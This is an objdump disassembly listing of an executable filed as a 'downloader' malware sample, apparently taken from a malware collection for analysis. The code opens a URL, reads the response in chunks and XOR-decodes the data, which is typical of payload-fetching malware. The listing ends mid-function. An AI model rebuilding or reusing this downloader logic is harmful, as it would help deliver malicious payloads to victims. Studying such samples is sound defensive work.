
malware_samples/downloader/929cf7a15968a4e38eccb852a72874d58c3962f52dcac97cc69b5a6aa113c2d4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	c3                   	ret
  401001:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401008:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40100f:	90                   	nop
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 84 50 44 00 01 	movl   $0x1,0x445084
  401025:	00 00 00 
  401028:	c7 05 80 50 44 00 01 	movl   $0x1,0x445080
  40102f:	00 00 00 
  401032:	c7 05 7c 50 44 00 01 	movl   $0x1,0x44507c
  401039:	00 00 00 
  40103c:	75 18                	jne    0x401056
  40103e:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  401044:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  40104b:	45 00 00 
  40104e:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  401054:	74 5a                	je     0x4010b0
  401056:	a3 0c 50 44 00       	mov    %eax,0x44500c
  40105b:	a1 90 50 44 00       	mov    0x445090,%eax
  401060:	85 c0                	test   %eax,%eax
  401062:	74 3c                	je     0x4010a0
  401064:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40106b:	e8 20 74 01 00       	call   0x418490
  401070:	e8 13 74 01 00       	call   0x418488
  401075:	8b 15 a4 50 44 00    	mov    0x4450a4,%edx
  40107b:	89 10                	mov    %edx,(%eax)
  40107d:	e8 fe 73 01 00       	call   0x418480
  401082:	8b 15 8c 50 44 00    	mov    0x44508c,%edx
  401088:	89 10                	mov    %edx,(%eax)
  40108a:	e8 71 bc 00 00       	call   0x40cd00
  40108f:	83 3d 1c e0 42 00 01 	cmpl   $0x1,0x42e01c
  401096:	74 48                	je     0x4010e0
  401098:	31 c0                	xor    %eax,%eax
  40109a:	83 c4 1c             	add    $0x1c,%esp
  40109d:	c3                   	ret
  40109e:	66 90                	xchg   %ax,%ax
  4010a0:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4010a7:	e8 e4 73 01 00       	call   0x418490
  4010ac:	eb c2                	jmp    0x401070
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010b4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010b9:	74 3d                	je     0x4010f8
  4010bb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010c0:	75 94                	jne    0x401056
  4010c2:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010c9:	76 8b                	jbe    0x401056
  4010cb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010d1:	31 c0                	xor    %eax,%eax
  4010d3:	85 d2                	test   %edx,%edx
  4010d5:	0f 95 c0             	setne  %al
  4010d8:	e9 79 ff ff ff       	jmp    0x401056
  4010dd:	8d 76 00             	lea    0x0(%esi),%esi
  4010e0:	c7 04 24 10 ce 40 00 	movl   $0x40ce10,(%esp)
  4010e7:	e8 d4 c2 00 00       	call   0x40d3c0
  4010ec:	31 c0                	xor    %eax,%eax
  4010ee:	83 c4 1c             	add    $0x1c,%esp
  4010f1:	c3                   	ret
  4010f2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4010f8:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  4010fc:	0f 86 54 ff ff ff    	jbe    0x401056
  401102:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401108:	31 c0                	xor    %eax,%eax
  40110a:	85 c9                	test   %ecx,%ecx
  40110c:	0f 95 c0             	setne  %al
  40110f:	e9 42 ff ff ff       	jmp    0x401056
  401114:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40111b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40111f:	90                   	nop
  401120:	83 ec 2c             	sub    $0x2c,%esp
  401123:	a1 78 50 44 00       	mov    0x445078,%eax
  401128:	c7 44 24 10 04 50 44 	movl   $0x445004,0x10(%esp)
  40112f:	00 
  401130:	a3 04 50 44 00       	mov    %eax,0x445004
  401135:	a1 14 e0 42 00       	mov    0x42e014,%eax
  40113a:	c7 44 24 08 14 50 44 	movl   $0x445014,0x8(%esp)
  401141:	00 
  401142:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401146:	c7 44 24 04 18 50 44 	movl   $0x445018,0x4(%esp)
  40114d:	00 
  40114e:	c7 04 24 1c 50 44 00 	movl   $0x44501c,(%esp)
  401155:	e8 16 73 01 00       	call   0x418470
  40115a:	83 c4 2c             	add    $0x2c,%esp
  40115d:	c3                   	ret
  40115e:	66 90                	xchg   %ax,%ax
  401160:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401164:	83 e4 f0             	and    $0xfffffff0,%esp
  401167:	ff 71 fc             	push   -0x4(%ecx)
  40116a:	55                   	push   %ebp
  40116b:	89 e5                	mov    %esp,%ebp
  40116d:	57                   	push   %edi
  40116e:	56                   	push   %esi
  40116f:	53                   	push   %ebx
  401170:	31 db                	xor    %ebx,%ebx
  401172:	51                   	push   %ecx
  401173:	83 ec 28             	sub    $0x28,%esp
  401176:	8b 35 d0 62 44 00    	mov    0x4462d0,%esi
  40117c:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  401182:	8b 78 04             	mov    0x4(%eax),%edi
  401185:	eb 1d                	jmp    0x4011a4
  401187:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40118e:	66 90                	xchg   %ax,%ax
  401190:	39 c7                	cmp    %eax,%edi
  401192:	0f 84 88 01 00 00    	je     0x401320
  401198:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  40119f:	ff d6                	call   *%esi
  4011a1:	83 ec 04             	sub    $0x4,%esp
  4011a4:	89 d8                	mov    %ebx,%eax
  4011a6:	f0 0f b1 3d 70 50 44 	lock cmpxchg %edi,0x445070
  4011ad:	00 
  4011ae:	85 c0                	test   %eax,%eax
  4011b0:	75 de                	jne    0x401190
  4011b2:	a1 74 50 44 00       	mov    0x445074,%eax
  4011b7:	31 db                	xor    %ebx,%ebx
  4011b9:	83 f8 01             	cmp    $0x1,%eax
  4011bc:	0f 84 71 01 00 00    	je     0x401333
  4011c2:	a1 74 50 44 00       	mov    0x445074,%eax
  4011c7:	85 c0                	test   %eax,%eax
  4011c9:	0f 84 d1 01 00 00    	je     0x4013a0
  4011cf:	c7 05 08 50 44 00 01 	movl   $0x1,0x445008
  4011d6:	00 00 00 
  4011d9:	a1 74 50 44 00       	mov    0x445074,%eax
  4011de:	83 f8 01             	cmp    $0x1,%eax
  4011e1:	0f 84 66 01 00 00    	je     0x40134d
  4011e7:	85 db                	test   %ebx,%ebx
  4011e9:	0f 84 84 01 00 00    	je     0x401373
  4011ef:	a1 40 1b 43 00       	mov    0x431b40,%eax
  4011f4:	85 c0                	test   %eax,%eax
  4011f6:	74 1c                	je     0x401214
  4011f8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4011ff:	00 
  401200:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401207:	00 
  401208:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40120f:	ff d0                	call   *%eax
  401211:	83 ec 0c             	sub    $0xc,%esp
  401214:	e8 47 be 00 00       	call   0x40d060
  401219:	c7 04 24 d0 d3 40 00 	movl   $0x40d3d0,(%esp)
  401220:	ff 15 cc 62 44 00    	call   *0x4462cc
  401226:	83 ec 04             	sub    $0x4,%esp
  401229:	a3 a8 50 44 00       	mov    %eax,0x4450a8
  40122e:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  401235:	e8 76 6c 01 00       	call   0x417eb0
  40123a:	e8 51 bc 00 00       	call   0x40ce90
  40123f:	8b 35 1c 50 44 00    	mov    0x44501c,%esi
  401245:	8d 3c b5 04 00 00 00 	lea    0x4(,%esi,4),%edi
  40124c:	89 3c 24             	mov    %edi,(%esp)
  40124f:	e8 cc 72 01 00       	call   0x418520
  401254:	8b 1d 18 50 44 00    	mov    0x445018,%ebx
  40125a:	89 c1                	mov    %eax,%ecx
  40125c:	85 f6                	test   %esi,%esi
  40125e:	0f 8e 64 01 00 00    	jle    0x4013c8
  401264:	8d 57 fc             	lea    -0x4(%edi),%edx
  401267:	89 c6                	mov    %eax,%esi
  401269:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40126c:	8d 04 13             	lea    (%ebx,%edx,1),%eax
  40126f:	89 55 dc             	mov    %edx,-0x24(%ebp)
  401272:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401275:	8d 76 00             	lea    0x0(%esi),%esi
  401278:	8b 03                	mov    (%ebx),%eax
  40127a:	83 c3 04             	add    $0x4,%ebx
  40127d:	83 c6 04             	add    $0x4,%esi
  401280:	89 04 24             	mov    %eax,(%esp)
  401283:	e8 f0 72 01 00       	call   0x418578
  401288:	8d 78 01             	lea    0x1(%eax),%edi
  40128b:	89 3c 24             	mov    %edi,(%esp)
  40128e:	e8 8d 72 01 00       	call   0x418520
  401293:	89 46 fc             	mov    %eax,-0x4(%esi)
  401296:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  401299:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40129d:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4012a1:	89 04 24             	mov    %eax,(%esp)
  4012a4:	e8 8f 72 01 00       	call   0x418538
  4012a9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4012ac:	39 c3                	cmp    %eax,%ebx
  4012ae:	75 c8                	jne    0x401278
  4012b0:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4012b3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4012b6:	01 ca                	add    %ecx,%edx
  4012b8:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  4012be:	89 0d 18 50 44 00    	mov    %ecx,0x445018
  4012c4:	e8 17 ba 00 00       	call   0x40cce0
  4012c9:	a1 14 50 44 00       	mov    0x445014,%eax
  4012ce:	8b 15 04 63 44 00    	mov    0x446304,%edx
  4012d4:	89 02                	mov    %eax,(%edx)
  4012d6:	89 44 24 08          	mov    %eax,0x8(%esp)
  4012da:	a1 18 50 44 00       	mov    0x445018,%eax
  4012df:	89 44 24 04          	mov    %eax,0x4(%esp)
  4012e3:	a1 1c 50 44 00       	mov    0x44501c,%eax
  4012e8:	89 04 24             	mov    %eax,(%esp)
  4012eb:	e8 e0 c0 02 00       	call   0x42d3d0
  4012f0:	8b 0d 0c 50 44 00    	mov    0x44500c,%ecx
  4012f6:	a3 10 50 44 00       	mov    %eax,0x445010
  4012fb:	85 c9                	test   %ecx,%ecx
  4012fd:	0f 84 cc 00 00 00    	je     0x4013cf
  401303:	8b 15 08 50 44 00    	mov    0x445008,%edx
  401309:	85 d2                	test   %edx,%edx
  40130b:	74 73                	je     0x401380
  40130d:	8d 65 f0             	lea    -0x10(%ebp),%esp
  401310:	59                   	pop    %ecx
  401311:	5b                   	pop    %ebx
  401312:	5e                   	pop    %esi
  401313:	5f                   	pop    %edi
  401314:	5d                   	pop    %ebp
  401315:	8d 61 fc             	lea    -0x4(%ecx),%esp
  401318:	c3                   	ret
  401319:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401320:	a1 74 50 44 00       	mov    0x445074,%eax
  401325:	bb 01 00 00 00       	mov    $0x1,%ebx
  40132a:	83 f8 01             	cmp    $0x1,%eax
  40132d:	0f 85 8f fe ff ff    	jne    0x4011c2
  401333:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  40133a:	e8 61 71 01 00       	call   0x4184a0
  40133f:	a1 74 50 44 00       	mov    0x445074,%eax
  401344:	83 f8 01             	cmp    $0x1,%eax
  401347:	0f 85 9a fe ff ff    	jne    0x4011e7
  40134d:	c7 44 24 04 08 70 44 	movl   $0x447008,0x4(%esp)
  401354:	00 
  401355:	c7 04 24 00 70 44 00 	movl   $0x447000,(%esp)
  40135c:	e8 57 71 01 00       	call   0x4184b8
  401361:	c7 05 74 50 44 00 02 	movl   $0x2,0x445074
  401368:	00 00 00 
  40136b:	85 db                	test   %ebx,%ebx
  40136d:	0f 85 7c fe ff ff    	jne    0x4011ef
  401373:	87 1d 70 50 44 00    	xchg   %ebx,0x445070
  401379:	e9 71 fe ff ff       	jmp    0x4011ef
  40137e:	66 90                	xchg   %ax,%ax
  401380:	e8 23 71 01 00       	call   0x4184a8
  401385:	a1 10 50 44 00       	mov    0x445010,%eax
  40138a:	8d 65 f0             	lea    -0x10(%ebp),%esp
  40138d:	59                   	pop    %ecx
  40138e:	5b                   	pop    %ebx
  40138f:	5e                   	pop    %esi
  401390:	5f                   	pop    %edi
  401391:	5d                   	pop    %ebp
  401392:	8d 61 fc             	lea    -0x4(%ecx),%esp
  401395:	c3                   	ret
  401396:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40139d:	8d 76 00             	lea    0x0(%esi),%esi
  4013a0:	c7 05 74 50 44 00 01 	movl   $0x1,0x445074
  4013a7:	00 00 00 
  4013aa:	c7 44 24 04 14 70 44 	movl   $0x447014,0x4(%esp)
  4013b1:	00 
  4013b2:	c7 04 24 0c 70 44 00 	movl   $0x44700c,(%esp)
  4013b9:	e8 fa 70 01 00       	call   0x4184b8
  4013be:	e9 16 fe ff ff       	jmp    0x4011d9
  4013c3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4013c7:	90                   	nop
  4013c8:	89 c2                	mov    %eax,%edx
  4013ca:	e9 e9 fe ff ff       	jmp    0x4012b8
  4013cf:	89 04 24             	mov    %eax,(%esp)
  4013d2:	e8 09 c4 00 00       	call   0x40d7e0
  4013d7:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4013de:	66 90                	xchg   %ax,%ax
  4013e0:	c7 05 90 50 44 00 01 	movl   $0x1,0x445090
  4013e7:	00 00 00 
  4013ea:	e9 71 fd ff ff       	jmp    0x401160
  4013ef:	90                   	nop
  4013f0:	c7 05 90 50 44 00 00 	movl   $0x0,0x445090
  4013f7:	00 00 00 
  4013fa:	e9 61 fd ff ff       	jmp    0x401160
  4013ff:	90                   	nop
  401400:	83 ec 1c             	sub    $0x1c,%esp
  401403:	8b 44 24 20          	mov    0x20(%esp),%eax
  401407:	89 04 24             	mov    %eax,(%esp)
  40140a:	e8 b9 70 01 00       	call   0x4184c8
  40140f:	83 f8 01             	cmp    $0x1,%eax
  401412:	19 c0                	sbb    %eax,%eax
  401414:	83 c4 1c             	add    $0x1c,%esp
  401417:	c3                   	ret
  401418:	90                   	nop
  401419:	90                   	nop
  40141a:	90                   	nop
  40141b:	90                   	nop
  40141c:	90                   	nop
  40141d:	90                   	nop
  40141e:	90                   	nop
  40141f:	90                   	nop
  401420:	55                   	push   %ebp
  401421:	89 e5                	mov    %esp,%ebp
  401423:	57                   	push   %edi
  401424:	56                   	push   %esi
  401425:	53                   	push   %ebx
  401426:	83 ec 1c             	sub    $0x1c,%esp
  401429:	c7 04 24 00 f0 42 00 	movl   $0x42f000,(%esp)
  401430:	ff 15 54 62 44 00    	call   *0x446254
  401436:	83 ec 04             	sub    $0x4,%esp
  401439:	85 c0                	test   %eax,%eax
  40143b:	74 73                	je     0x4014b0
  40143d:	89 c3                	mov    %eax,%ebx
  40143f:	c7 04 24 00 f0 42 00 	movl   $0x42f000,(%esp)
  401446:	ff 15 88 62 44 00    	call   *0x446288
  40144c:	8b 3d 5c 62 44 00    	mov    0x44625c,%edi
  401452:	83 ec 04             	sub    $0x4,%esp
  401455:	a3 20 50 44 00       	mov    %eax,0x445020
  40145a:	c7 44 24 04 13 f0 42 	movl   $0x42f013,0x4(%esp)
  401461:	00 
  401462:	89 1c 24             	mov    %ebx,(%esp)
  401465:	ff d7                	call   *%edi
  401467:	83 ec 08             	sub    $0x8,%esp
  40146a:	89 c6                	mov    %eax,%esi
  40146c:	c7 44 24 04 29 f0 42 	movl   $0x42f029,0x4(%esp)
  401473:	00 
  401474:	89 1c 24             	mov    %ebx,(%esp)
  401477:	ff d7                	call   *%edi
  401479:	83 ec 08             	sub    $0x8,%esp
  40147c:	a3 00 e0 42 00       	mov    %eax,0x42e000
  401481:	85 f6                	test   %esi,%esi
  401483:	74 11                	je     0x401496
  401485:	c7 44 24 04 24 50 44 	movl   $0x445024,0x4(%esp)
  40148c:	00 
  40148d:	c7 04 24 04 41 43 00 	movl   $0x434104,(%esp)
  401494:	ff d6                	call   *%esi
  401496:	c7 04 24 c0 14 40 00 	movl   $0x4014c0,(%esp)
  40149d:	e8 5e ff ff ff       	call   0x401400
  4014a2:	8d 65 f4             	lea    -0xc(%ebp),%esp
  4014a5:	5b                   	pop    %ebx
  4014a6:	5e                   	pop    %esi
  4014a7:	5f                   	pop    %edi
  4014a8:	5d                   	pop    %ebp
  4014a9:	c3                   	ret
  4014aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014b0:	b8 80 26 41 00       	mov    $0x412680,%eax
  4014b5:	be f0 23 41 00       	mov    $0x4123f0,%esi
  4014ba:	eb c0                	jmp    0x40147c
  4014bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4014c0:	55                   	push   %ebp
  4014c1:	89 e5                	mov    %esp,%ebp
  4014c3:	83 ec 18             	sub    $0x18,%esp
  4014c6:	a1 00 e0 42 00       	mov    0x42e000,%eax
  4014cb:	85 c0                	test   %eax,%eax
  4014cd:	74 09                	je     0x4014d8
  4014cf:	c7 04 24 04 41 43 00 	movl   $0x434104,(%esp)
  4014d6:	ff d0                	call   *%eax
  4014d8:	a1 20 50 44 00       	mov    0x445020,%eax
  4014dd:	85 c0                	test   %eax,%eax
  4014df:	74 0c                	je     0x4014ed
  4014e1:	89 04 24             	mov    %eax,(%esp)
  4014e4:	ff 15 38 62 44 00    	call   *0x446238
  4014ea:	83 ec 04             	sub    $0x4,%esp
  4014ed:	c9                   	leave
  4014ee:	c3                   	ret
  4014ef:	90                   	nop
  4014f0:	55                   	push   %ebp
  4014f1:	89 e5                	mov    %esp,%ebp
  4014f3:	53                   	push   %ebx
  4014f4:	83 ec 10             	sub    $0x10,%esp
  4014f7:	c7 45 f4 7b 02 00 00 	movl   $0x27b,-0xc(%ebp)
  4014fe:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401505:	eb 16                	jmp    0x40151d
  401507:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40150a:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  401511:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401514:	01 d0                	add    %edx,%eax
  401516:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401519:	83 45 f8 01          	addl   $0x1,-0x8(%ebp)
  40151d:	83 7d f8 0b          	cmpl   $0xb,-0x8(%ebp)
  401521:	7e e4                	jle    0x401507
  401523:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401526:	ba 56 55 55 55       	mov    $0x55555556,%edx
  40152b:	89 c8                	mov    %ecx,%eax
  40152d:	f7 ea                	imul   %edx
  40152f:	89 d3                	mov    %edx,%ebx
  401531:	c1 f9 1f             	sar    $0x1f,%ecx
  401534:	89 ca                	mov    %ecx,%edx
  401536:	89 d8                	mov    %ebx,%eax
  401538:	29 d0                	sub    %edx,%eax
  40153a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40153d:	90                   	nop
  40153e:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401541:	c9                   	leave
  401542:	c3                   	ret
  401543:	55                   	push   %ebp
  401544:	89 e5                	mov    %esp,%ebp
  401546:	83 ec 10             	sub    $0x10,%esp
  401549:	c7 45 f8 fa 02 00 00 	movl   $0x2fa,-0x8(%ebp)
  401550:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401557:	eb 18                	jmp    0x401571
  401559:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40155c:	89 d0                	mov    %edx,%eax
  40155e:	c1 e0 03             	shl    $0x3,%eax
  401561:	29 d0                	sub    %edx,%eax
  401563:	89 c1                	mov    %eax,%ecx
  401565:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401568:	01 c8                	add    %ecx,%eax
  40156a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40156d:	83 45 fc 01          	addl   $0x1,-0x4(%ebp)
  401571:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  401575:	7e e2                	jle    0x401559
  401577:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40157a:	89 c2                	mov    %eax,%edx
  40157c:	c1 ea 1f             	shr    $0x1f,%edx
  40157f:	01 d0                	add    %edx,%eax
  401581:	d1 f8                	sar    $1,%eax
  401583:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401586:	90                   	nop
  401587:	c9                   	leave
  401588:	c3                   	ret
  401589:	55                   	push   %ebp
  40158a:	89 e5                	mov    %esp,%ebp
  40158c:	53                   	push   %ebx
  40158d:	83 ec 24             	sub    $0x24,%esp
  401590:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401597:	eb 4b                	jmp    0x4015e4
  401599:	8b 45 0c             	mov    0xc(%ebp),%eax
  40159c:	89 c1                	mov    %eax,%ecx
  40159e:	e8 4d 0f 02 00       	call   0x4224f0
  4015a3:	89 c3                	mov    %eax,%ebx
  4015a5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4015a8:	ba 00 00 00 00       	mov    $0x0,%edx
  4015ad:	f7 f3                	div    %ebx
  4015af:	89 d1                	mov    %edx,%ecx
  4015b1:	89 ca                	mov    %ecx,%edx
  4015b3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015b6:	89 14 24             	mov    %edx,(%esp)
  4015b9:	89 c1                	mov    %eax,%ecx
  4015bb:	e8 10 13 02 00       	call   0x4228d0
  4015c0:	83 ec 04             	sub    $0x4,%esp
  4015c3:	0f b6 18             	movzbl (%eax),%ebx
  4015c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4015c9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4015cc:	89 14 24             	mov    %edx,(%esp)
  4015cf:	89 c1                	mov    %eax,%ecx
  4015d1:	e8 0e 63 02 00       	call   0x4278e4
  4015d6:	83 ec 04             	sub    $0x4,%esp
  4015d9:	0f b6 10             	movzbl (%eax),%edx
  4015dc:	31 da                	xor    %ebx,%edx
  4015de:	88 10                	mov    %dl,(%eax)
  4015e0:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4015e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4015e7:	89 c1                	mov    %eax,%ecx
  4015e9:	e8 da 04 02 00       	call   0x421ac8
  4015ee:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  4015f1:	0f 92 c0             	setb   %al
  4015f4:	84 c0                	test   %al,%al
  4015f6:	75 a1                	jne    0x401599
  4015f8:	90                   	nop
  4015f9:	90                   	nop
  4015fa:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4015fd:	c9                   	leave
  4015fe:	c3                   	ret
  4015ff:	55                   	push   %ebp
  401600:	89 e5                	mov    %esp,%ebp
  401602:	53                   	push   %ebx
  401603:	b8 84 10 00 00       	mov    $0x1084,%eax
  401608:	e8 d3 c5 00 00       	call   0x40dbe0
  40160d:	29 c4                	sub    %eax,%esp
  40160f:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401616:	00 
  401617:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40161e:	00 
  40161f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401626:	00 
  401627:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40162e:	00 
  40162f:	c7 04 24 44 f0 42 00 	movl   $0x42f044,(%esp)
  401636:	a1 d8 63 44 00       	mov    0x4463d8,%eax
  40163b:	ff d0                	call   *%eax
  40163d:	83 ec 14             	sub    $0x14,%esp
  401640:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401643:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  401647:	75 0a                	jne    0x401653
  401649:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  40164e:	e9 55 03 00 00       	jmp    0x4019a8
  401653:	b9 3c 50 44 00       	mov    $0x44503c,%ecx
  401658:	e8 c3 0c 02 00       	call   0x422320
  40165d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401664:	00 
  401665:	c7 44 24 10 00 00 80 	movl   $0x84800000,0x10(%esp)
  40166c:	84 
  40166d:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401674:	00 
  401675:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40167c:	00 
  40167d:	89 44 24 04          	mov    %eax,0x4(%esp)
  401681:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401684:	89 04 24             	mov    %eax,(%esp)
  401687:	a1 dc 63 44 00       	mov    0x4463dc,%eax
  40168c:	ff d0                	call   *%eax
  40168e:	83 ec 18             	sub    $0x18,%esp
  401691:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401694:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  401698:	75 1a                	jne    0x4016b4
  40169a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40169d:	89 04 24             	mov    %eax,(%esp)
  4016a0:	a1 d4 63 44 00       	mov    0x4463d4,%eax
  4016a5:	ff d0                	call   *%eax
  4016a7:	83 ec 04             	sub    $0x4,%esp
  4016aa:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  4016af:	e9 f4 02 00 00       	jmp    0x4019a8
  4016b4:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4016b7:	89 c1                	mov    %eax,%ecx
  4016b9:	e8 c6 61 02 00       	call   0x427884
  4016be:	c7 85 c0 ef ff ff 00 	movl   $0x0,-0x1040(%ebp)
  4016c5:	00 00 00 
  4016c8:	eb 50                	jmp    0x40171a
  4016ca:	8b 85 c0 ef ff ff    	mov    -0x1040(%ebp),%eax
  4016d0:	8d 95 c4 ef ff ff    	lea    -0x103c(%ebp),%edx
  4016d6:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  4016d9:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4016dc:	89 c1                	mov    %eax,%ecx
  4016de:	e8 9d 60 02 00       	call   0x427780
  4016e3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4016e6:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4016e9:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4016ec:	89 14 24             	mov    %edx,(%esp)
  4016ef:	89 c1                	mov    %eax,%ecx
  4016f1:	e8 82 e7 01 00       	call   0x41fe78
  4016f6:	83 ec 04             	sub    $0x4,%esp
  4016f9:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4016fc:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  401700:	8d 95 c4 ef ff ff    	lea    -0x103c(%ebp),%edx
  401706:	89 54 24 04          	mov    %edx,0x4(%esp)
  40170a:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40170d:	89 14 24             	mov    %edx,(%esp)
  401710:	89 c1                	mov    %eax,%ecx
  401712:	e8 d1 60 02 00       	call   0x4277e8
  401717:	83 ec 0c             	sub    $0xc,%esp
  40171a:	8d 85 c0 ef ff ff    	lea    -0x1040(%ebp),%eax
  401720:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401724:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  40172b:	00 
  40172c:	8d 85 c4 ef ff ff    	lea    -0x103c(%ebp),%eax
  401732:	89 44 24 04          	mov    %eax,0x4(%esp)
  401736:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401739:	89 04 24             	mov    %eax,(%esp)
  40173c:	a1 e0 63 44 00       	mov    0x4463e0,%eax
  401741:	ff d0                	call   *%eax
  401743:	83 ec 10             	sub    $0x10,%esp
  401746:	85 c0                	test   %eax,%eax
  401748:	74 11                	je     0x40175b
  40174a:	8b 85 c0 ef ff ff    	mov    -0x1040(%ebp),%eax
  401750:	85 c0                	test   %eax,%eax
  401752:	74 07                	je     0x40175b
  401754:	b8 01 00 00 00       	mov    $0x1,%eax
  401759:	eb 05                	jmp    0x401760
  40175b:	b8 00 00 00 00       	mov    $0x0,%eax
  401760:	84 c0                	test   %al,%al
  401762:	0f 85 62 ff ff ff    	jne    0x4016ca
  401768:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40176b:	89 04 24             	mov    %eax,(%esp)
  40176e:	a1 d4 63 44 00       	mov    0x4463d4,%eax
  401773:	ff d0                	call   *%eax
  401775:	83 ec 04             	sub    $0x4,%esp
  401778:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40177b:	89 04 24             	mov    %eax,(%esp)
  40177e:	a1 d4 63 44 00       	mov    0x4463d4,%eax
  401783:	ff d0                	call   *%eax
  401785:	83 ec 04             	sub    $0x4,%esp
  401788:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40178b:	89 c1                	mov    %eax,%ecx
  40178d:	e8 76 03 02 00       	call   0x421b08
  401792:	84 c0                	test   %al,%al
  401794:	74 0a                	je     0x4017a0
  401796:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  40179b:	e9 fe 01 00 00       	jmp    0x40199e
  4017a0:	e8 4b fd ff ff       	call   0x4014f0
